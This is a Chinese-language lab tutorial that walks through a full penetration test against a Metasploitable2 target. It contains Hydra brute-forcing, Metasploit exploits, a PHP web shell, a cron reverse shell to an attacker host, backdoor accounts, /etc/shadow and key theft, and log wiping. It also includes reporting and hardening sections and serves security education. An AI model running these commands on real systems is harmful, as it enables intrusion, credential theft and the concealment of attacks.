# 🎯 综合实战：完整渗透测试演练

> **难度**：⭐⭐⭐⭐⭐ 高级  
> **预计时间**：120分钟  
> **工具**：Nmap、Nikto、Hydra、John、Metasploit、OpenSSL、SSH

---

## 🎯 学习目标

通过本综合实战，你将：

- ✅ 理解完整渗透测试的生命周期
- ✅ 综合运用多种安全工具
- ✅ 模拟真实攻击链：信息收集 → 漏洞扫描 → 密码破解 → 权限获取 → 痕迹清除
- ✅ 学习编写渗透测试报告
- ✅ 理解攻击者的思维方式，提升防御能力

---

## 📖 背景知识

### 渗透测试阶段

```
渗透测试生命周期（PTES）：

阶段 1：前期交互（Pre-Engagement）
├── 明确测试范围
├── 签署授权文件
├── 确定测试类型（黑盒/白盒/灰盒）
└── 定义成功标准

阶段 2：信息收集（Reconnaissance）
├── 被动信息收集（OSINT）
│   ├── 搜索引擎查询
│   ├── WHOIS 查询
│   └── 社交媒体侦察
└── 主动信息收集
    ├── 端口扫描
    ├── 服务识别
    └── 漏洞扫描

阶段 3：威胁建模（Threat Modeling）
├── 分析攻击面
├── 识别高价值目标
└── 制定攻击策略

阶段 4：漏洞分析（Vulnerability Analysis）
├── 自动化扫描
├── 手动验证
└── 漏洞优先级排序

阶段 5：漏洞利用（Exploitation）
├── 选择利用方式
├── 执行攻击
└── 获取访问权限

阶段 6：后渗透（Post-Exploitation）
├── 权限提升
├── 横向移动
├── 数据收集
└── 持久化

阶段 7：报告（Reporting）
├── 发现总结
├── 风险评估
└── 修复建议
```

### 攻击链模型

```
Cyber Kill Chain：

1. 侦察（Reconnaissance）────┐
2. 武器化（Weaponization）   │
3. 投递（Delivery）          │ 攻击者
4. 漏洞利用（Exploitation）──┤
5. 安装（Installation）      │
6. 命令控制（C2）            │
7. 目标行动（Actions）───────┘

防御者在每个阶段都有阻断机会！
```

### ⚠️ 重要法律声明

> **本实验必须在合法授权环境下进行！**
> 
> - ✅ 仅在**自己拥有的靶机环境**中练习
> - ✅ 使用专门的 CTF 平台或授权靶场
> - ❌ **严禁**对未授权的真实系统进行任何测试
> - ❌ **严禁**利用所学技术进行非法入侵
> - ❌ **严禁**泄露、传播、出售他人数据
> 
> **违法后果**：根据《中华人民共和国刑法》第285条、286条，非法侵入计算机信息系统罪可处三年以下有期徒刑；后果严重的可处三年以上七年以下有期徒刑。

---

## 🔧 环境准备

### 靶机环境设置

本实验使用 **Metasploitable2** 作为靶机：

```bash
# 方法1：使用 Docker（推荐）
docker pull tleemcjr/metasploitable2
docker run -d -p 22:22 -p 80:80 -p 139:139 -p 445:445 -p 3306:3306 \
    --name target metasploitable2

# 获取靶机 IP
docker inspect target | grep IPAddress

# 记录靶机 IP（假设为 172.17.0.2）
TARGET_IP="172.17.0.2"

# 方法2：使用 VMware/VirtualBox
# 下载 Metasploitable2 镜像：https://sourceforge.net/projects/metasploitable/
# 导入虚拟机，网络模式设置为 NAT 或 Host-Only
```

### 攻击机环境

```bash
# 推荐使用 Kali Linux
# 验证工具已安装
nmap --version
nikto -Version
hydra -h
msfconsole --version

# 创建工作目录
mkdir -p ~/pentest_lab/{recon,scans,exploits,evidence}
cd ~/pentest_lab
```

---

## 👨‍💻 实战演练

### 阶段 1：信息收集（Reconnaissance）

#### 1.1 主机发现

```bash
# 扫描目标网段存活主机
nmap -sn 172.17.0.0/24 -oA recon/hosts

# 查看结果
grep "Nmap scan report" recon/hosts.gnmap

# 输出示例：
# Nmap scan report for 172.17.0.1
# Nmap scan report for 172.17.0.2 (target)

# 确定目标
TARGET="172.17.0.2"
echo "目标: $TARGET" > target.txt
```

#### 1.2 端口扫描

```bash
# 全端口扫描
nmap -p- -T4 $TARGET -oA recon/ports_all

# 常用端口快速扫描
nmap -sS -sV -O -p 21,22,23,25,80,139,443,445,3306,5432,8080 \
    $TARGET -oA recon/ports_service

# 查看开放端口
grep "open" recon/ports_service.nmap

# 输出示例：
# 21/tcp   open  ftp         vsftpd 2.3.4
# 22/tcp   open  ssh         OpenSSH 4.7p1
# 80/tcp   open  http        Apache httpd 2.2.8
# 139/tcp  open  netbios-ssn Samba smbd 3.x - 4.x
# 445/tcp  open  netbios-ssn Samba smbd 3.x - 4.x
# 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
```

#### 1.3 服务识别

```bash
# 详细服务版本探测
nmap -sV --version-intensity 5 $TARGET -oA recon/service_detail

# 操作系统识别
nmap -O $TARGET -oA recon/os_detect

# 查看结果
cat recon/service_detail.nmap
```

---

### 阶段 2：漏洞扫描（Vulnerability Analysis）

#### 2.1 使用 Nmap 脚本扫描

```bash
# 漏洞扫描
nmap --script=vuln $TARGET -oA scans/vuln_scan

# 查看发现的漏洞
grep "VULNERABLE\|CVE" scans/vuln_scan.nmap

# 常见输出：
# vsftpd-2.3.4-backdoor: VULNERABLE
# CVE-2011-2523
# samba-vuln-cve-2012-1182: VULNERABLE
```

#### 2.2 Web 漏洞扫描

```bash
# 使用 Nikto 扫描 Web 服务
nikto -h http://$TARGET -o scans/nikto.txt

# 查看结果
cat scans/nikto.txt

# 使用 dirb 发现隐藏目录
dirb http://$TARGET /usr/share/wordlists/dirb/common.txt -o scans/dirb.txt

# 查看发现的目录
cat scans/dirb.txt
```

#### 2.3 SMB 漏洞扫描

```bash
# 使用 Nmap SMB 脚本
nmap --script=smb-vuln* -p 139,445 $TARGET -oA scans/smb_vuln

# 使用 enum4linux 枚举 SMB 信息
enum4linux -a $TARGET > scans/smb_enum.txt

# 查看共享目录
grep "Sharename\|Disk" scans/smb_enum.txt
```

---

### 阶段 3：密码破解（Password Cracking）

#### 3.1 字典准备

```bash
# 使用 Kali 自带字典
ls /usr/share/wordlists/

# 解压 rockyou.txt
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# 创建小字典（加速测试）
head -100 /usr/share/wordlists/rockyou.txt > wordlist_small.txt

# 常见用户名
cat > users.txt << EOF
admin
root
msfadmin
user
test
EOF
```

#### 3.2 SSH 暴力破解

```bash
# 使用 Hydra 破解 SSH
hydra -L users.txt -P wordlist_small.txt $TARGET ssh -t 4 -o exploits/ssh_crack.txt

# 查看结果
cat exploits/ssh_crack.txt

# 预期结果（Metasploitable2 默认密码）：
# [22][ssh] host: 172.17.0.2   login: msfadmin   password: msfadmin
```

#### 3.3 FTP 暴力破解

```bash
# 破解 FTP
hydra -L users.txt -P wordlist_small.txt $TARGET ftp -t 4 -o exploits/ftp_crack.txt

# 查看结果
cat exploits/ftp_crack.txt
```

#### 3.4 MySQL 暴力破解

```bash
# 破解 MySQL
hydra -L users.txt -P wordlist_small.txt $TARGET mysql -t 4 -o exploits/mysql_crack.txt

# 预期结果：
# [3306][mysql] host: 172.17.0.2   login: root   password: 
# (MySQL root 用户无密码)
```

---

### 阶段 4：漏洞利用（Exploitation）

#### 4.1 利用 vsftpd 后门漏洞

```bash
# 启动 Metasploit
msfconsole

# 在 msfconsole 中执行：
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.17.0.2
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

# 获得反弹 shell
whoami
# 输出：root

# 保存证据
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -l
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1

# 在 shell 中
id
# uid=0(root) gid=0(root)
```

#### 4.2 利用 Samba 漏洞

```bash
# 如果 FTP 利用失败，尝试 Samba
msfconsole

msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 172.17.0.2
msf6 exploit(multi/samba/usermap_script) > exploit

# 获得 shell
whoami
# root
```

#### 4.3 利用 SSH 凭据

```bash
# 使用破解的 SSH 凭据登录
ssh msfadmin@172.17.0.2
# 密码：msfadmin

# 登录成功后
id
# uid=1000(msfadmin) gid=1000(msfadmin)

# 尝试提权
sudo -l
# User msfadmin may run the following commands on metasploitable:
# (root) NO PASSWD: ALL

sudo su
# 获得 root 权限
whoami
# root
```

#### 4.4 利用 MySQL 无密码访问

```bash
# 连接 MySQL
mysql -h 172.17.0.2 -u root

# 在 MySQL 中
mysql> SELECT user, host, password FROM mysql.user;
mysql> SELECT load_file('/etc/passwd');
mysql> SELECT "<?php system(\$_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php';

# 通过 Web 访问后门
curl "http://172.17.0.2/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data)
```

---

### 阶段 5：后渗透（Post-Exploitation）

#### 5.1 信息收集

```bash
# 在获得 shell 后

# 系统信息
uname -a
cat /etc/passwd
cat /etc/shadow  # 需要 root

# 网络信息
ifconfig -a
netstat -tunlp
route -n

# 用户信息
whoami
id
cat /etc/passwd | grep -v nologin

# 敏感文件查找
find / -name "*.conf" 2>/dev/null
find / -name "password*" 2>/dev/null
find / -name "*.key" 2>/dev/null
```

#### 5.2 提权

```bash
# 查找 SUID 文件
find / -perm -4000 2>/dev/null

# 检查 sudo 权限
sudo -l

# 内核漏洞提权
uname -r
# 2.6.24-16-server

# 搜索对应内核的提权漏洞
searchsploit linux kernel 2.6

# 使用 Metasploit 提权模块
msf6 > use post/multi/recon/local_exploit_suggester
```

#### 5.3 持久化

```bash
# 创建后门用户
useradd -m backdoor -s /bin/bash
echo "backdoor:backdoor123" | chpasswd

# 添加 SSH 公钥
mkdir -p ~/.ssh
echo "ssh-rsa AAAA... your_public_key" >> ~/.ssh/authorized_keys

# 创建定时任务后门
echo "* * * * * /bin/bash -i >& /dev/tcp/攻击机IP/4444 0>&1" | crontab -

# 创建 SUID 后门
cp /bin/bash /tmp/.backdoor
chmod 4755 /tmp/.backdoor
```

#### 5.4 数据收集

```bash
# 收集敏感数据

# 用户密码哈希
cat /etc/shadow > /tmp/hashes.txt

# SSH 私钥
cat ~/.ssh/id_rsa

# 数据库密码
cat /var/www/config.php

# 保存证据
tar -czf evidence.tar.gz /tmp/hashes.txt /var/www/config.php
```

---

### 阶段 6：痕迹清除（Covering Tracks）

> ⚠️ **注意**：真实渗透测试中，通常**不清理痕迹**，以便客户审计。

```bash
# 清除命令历史
history -c
echo "" > ~/.bash_history

# 清除日志
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# 删除临时文件
rm -f /tmp/.backdoor
rm -f /var/www/shell.php

# 还原时间戳
touch -r /etc/passwd /tmp/malicious_file

# 清除 SSH 登录记录
echo "" > /var/log/wtmp
echo "" > /var/log/btmp
```

---

### 阶段 7：撰写报告（Reporting）

#### 7.1 报告结构

```markdown
# 渗透测试报告

## 1. 执行摘要

- 测试时间：2024-XX-XX
- 测试范围：172.17.0.2
- 测试类型：黑盒测试
- 总体风险：严重

## 2. 测试范围

| 主机 | IP | 操作系统 |
|------|------|---------|
| Target-1 | 172.17.0.2 | Linux 2.6.24 |

## 3. 发现概览

| 编号 | 漏洞名称 | 风险等级 | CVSS 评分 |
|------|---------|---------|-----------|
| V-001 | vsftpd 后门漏洞 | 严重 | 10.0 |
| V-002 | SSH 弱密码 | 高危 | 8.0 |
| V-003 | MySQL 无密码访问 | 高危 | 7.5 |
| V-004 | Samba 远程代码执行 | 严重 | 10.0 |

## 4. 详细发现

### 4.1 vsftpd 2.3.4 后门漏洞 (V-001)

**风险等级**：严重

**CVSS 评分**：10.0

**影响主机**：172.17.0.2

**漏洞描述**：
vsftpd 2.3.4 版本存在后门漏洞，攻击者可利用该漏洞获取 root 权限的反弹 shell。

**复现步骤**：
1. 使用 Nmap 确认版本：`nmap -sV -p 21 172.17.0.2`
2. 使用 Metasploit 利用漏洞：`exploit/unix/ftp/vsftpd_234_backdoor`
3. 获取 root shell

**证据**：
```
[+] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.2:21 - Sending backdoor command...
[*] 172.17.0.2:21 - Backdoor response received
[*] Command shell session 1 opened
whoami
root
```

**修复建议**：
1. 升级 vsftpd 到最新版本
2. 关闭不必要的 FTP 服务
3. 使用 SFTP 替代 FTP

### 4.2 SSH 弱密码 (V-002)

**风险等级**：高危

**CVSS 评分**：8.0

**影响主机**：172.17.0.2

**漏洞描述**：
SSH 服务存在弱密码，msfadmin 用户使用默认密码 msfadmin。

**复现步骤**：
1. 使用 Hydra 进行暴力破解
2. 成功获取凭据：msfadmin/msfadmin
3. 成功登录 SSH

**修复建议**：
1. 修改所有默认密码
2. 实施密码复杂度策略
3. 启用多因素认证（MFA）
4. 配置 Fail2Ban 防暴力破解

## 5. 风险评估

- 整体安全态势：严重不足
- 外部攻击面：大
- 内部横向风险：高
- 数据泄露风险：极高

## 6. 修复优先级

| 优先级 | 漏洞编号 | 漏洞名称 | 预计修复时间 |
|--------|---------|---------|-------------|
| 1 | V-001 | vsftpd 后门漏洞 | 立即 |
| 2 | V-004 | Samba RCE | 立即 |
| 3 | V-002 | SSH 弱密码 | 1周内 |
| 4 | V-003 | MySQL 无密码 | 1周内 |

## 7. 总结与建议

### 7.1 主要发现
1. 存在已知高危漏洞
2. 默认凭据未修改
3. 服务未加固
4. 缺乏安全监控

### 7.2 整改建议
1. 立即修复所有高危漏洞
2. 修改所有默认密码
3. 关闭不必要的服务
4. 部署入侵检测系统
5. 定期进行安全评估

## 8. 附录

- 扫描报告
- 漏洞截图
- 利用代码
```

---

## ✅ 验证检查

完成实战后，请确认你能回答以下问题：

- [ ] 渗透测试的主要阶段有哪些？
- [ ] 如何发现目标系统的开放端口和服务？
- [ ] 漏洞扫描和漏洞利用有什么区别？
- [ ] 为什么密码破解需要使用字典？
- [ ] 在真实环境中，为什么痕迹清除不是标准步骤？

---

## 💡 进阶挑战

### 挑战1：完整攻击链脚本

```bash
#!/bin/bash
# auto_pentest.sh - 自动化渗透测试脚本

TARGET=$1

if [ -z "$TARGET" ]; then
    echo "用法: $0 <目标IP>"
    exit 1
fi

echo "=== 阶段 1：信息收集 ==="
nmap -sV -p- $TARGET -oA recon/ports

echo "=== 阶段 2：漏洞扫描 ==="
nmap --script=vuln $TARGET -oA scans/vuln

echo "=== 阶段 3：密码破解 ==="
hydra -L users.txt -P wordlist.txt $TARGET ssh -t 4 -o exploits/ssh.txt

echo "=== 阶段 4：生成报告 ==="
echo "目标: $TARGET" > report.txt
echo "开放端口:" >> report.txt
grep "open" recon/ports.nmap >> report.txt

echo "测试完成！"
```

### 挑战2：防御视角

```bash
# 检测攻击行为

# 1. 检查登录失败日志
grep "Failed password" /var/log/auth.log

# 2. 检查异常连接
netstat -tunap | grep ESTABLISHED

# 3. 检查 SUID 文件
find / -perm -4000 2>/dev/null

# 4. 部署 Fail2Ban
sudo apt install fail2ban
sudo systemctl enable fail2ban

# 5. 配置防火墙
sudo ufw default deny
sudo ufw allow 22
sudo ufw enable
```

### 挑战3：编写检测规则

```python
#!/usr/bin/env python3
# detect_attack.py - 攻击检测脚本

import re
import sys
from datetime import datetime

LOG_FILE = "/var/log/auth.log"

def detect_brute_force():
    """检测暴力破解"""
    failed_attempts = {}
    
    with open(LOG_FILE, 'r') as f:
        for line in f:
            if "Failed password" in line:
                match = re.search(r'from (\d+\.\d+\.\d+\.\d+)', line)
                if match:
                    ip = match.group(1)
                    failed_attempts[ip] = failed_attempts.get(ip, 0) + 1
    
    print("=== 暴力破解检测 ===")
    for ip, count in sorted(failed_attempts.items(), key=lambda x: x[1], reverse=True):
        if count > 5:
            print(f"[警告] IP {ip} 失败登录 {count} 次")

def detect_port_scan():
    """检测端口扫描"""
    print("=== 端口扫描检测 ===")
    # 使用 iptables 日志或 psad 工具
    # 这里简化处理
    print("建议安装 psad: sudo apt install psad")

if __name__ == '__main__':
    print(f"检测时间: {datetime.now()}")
    detect_brute_force()
    detect_port_scan()
```

---

## 🛡️ 防御措施总结

### 纵深防御策略

| 层级 | 措施 | 工具 |
|------|------|------|
| 网络层 | 防火墙、IDS/IPS | iptables, Snort, Suricata |
| 主机层 | 加固、补丁、EDR | CIS Benchmark, OSSEC |
| 应用层 | WAF、代码审计 | ModSecurity, SonarQube |
| 数据层 | 加密、访问控制 | OpenSSL, DLP |
| 用户层 | 安全意识培训 | 定期演练 |

### 安全加固清单

```bash
# 系统加固检查清单

# 1. 更新系统
sudo apt update && sudo apt upgrade -y

# 2. 禁用不必要的服务
sudo systemctl disable telnet
sudo systemctl disable ftp

# 3. 修改默认密码
passwd

# 4. 配置 SSH
sudo nano /etc/ssh/sshd_config
# PermitRootLogin no
# PasswordAuthentication no

# 5. 安装 Fail2Ban
sudo apt install fail2ban -y

# 6. 配置防火墙
sudo ufw default deny
sudo ufw allow ssh
sudo ufw enable

# 7. 定期审计
sudo apt install lynis -y
sudo lynis audit system
```

---

## 📚 参考资源

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES 技术指南](http://www.pentest-standard.org/index.php/Main_Page)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [CVE 数据库](https://cve.mitre.org/)

---

## 📝 实验笔记

> 在这里记录你的实战过程、发现和心得：

```
实验日期：
目标系统：
发现的漏洞：
利用成功的方法：
遇到的挑战：
防御建议：
学到的经验：
```

---

## 🎓 总结

通过本综合实战，你应该已经掌握了：

1. **信息收集**：使用 Nmap 等工具发现目标和服务
2. **漏洞扫描**：识别系统存在的安全漏洞
3. **密码破解**：使用 Hydra 等工具进行暴力破解
4. **漏洞利用**：使用 Metasploit 等框架获取系统权限
5. **后渗透**：信息收集、提权、持久化
6. **报告编写**：清晰记录发现和建议

**最重要的收获**：理解攻击者的思维方式，才能更好地进行防御！

---

*最后更新：2026-05-30*
